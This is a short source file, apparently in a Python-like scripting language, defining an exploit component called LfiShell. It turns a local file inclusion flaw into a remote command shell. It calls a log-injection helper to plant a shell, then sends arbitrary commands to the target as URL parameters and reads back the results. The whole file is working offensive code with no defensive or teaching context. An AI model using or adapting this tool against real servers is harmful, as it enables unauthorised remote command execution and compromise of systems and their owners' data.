import('urllib');
import('urllib2');

class ExploitComponent LfiShell {
    shell_info = null,

    __init__: @(url, next_url, next_data=None, dot='.', separator='/',
	            terminator='') {
        self.injector = LogInjector(url, next_url, next_data, dot,
                                    separator, terminator);
	},

    run: @(cmd) {
        if (self.shell_info == null) {
            self.log('[!] No known shell');
            i = self.injector.inject();
            if (i == null) {
                self.log('[-] Could not exploit LFI');
                ret null;
			}
            self.shell_info = i;
		}
        u = self.create_cmd_url(cmd);
        self.log('[?] %s' % u);
        _, d = self.shell_info;
        resp = urllib2.urlopen(u, d).read();
        ret resp;
	},

    create_cmd_url: @(cmd) {
        u, _ = self.shell_info;
        d = urllib.urlencode({cmd: cmd});
		x = u.__contains__('?') ? '&' : '?';        
        ret u + x + d;
	},
};
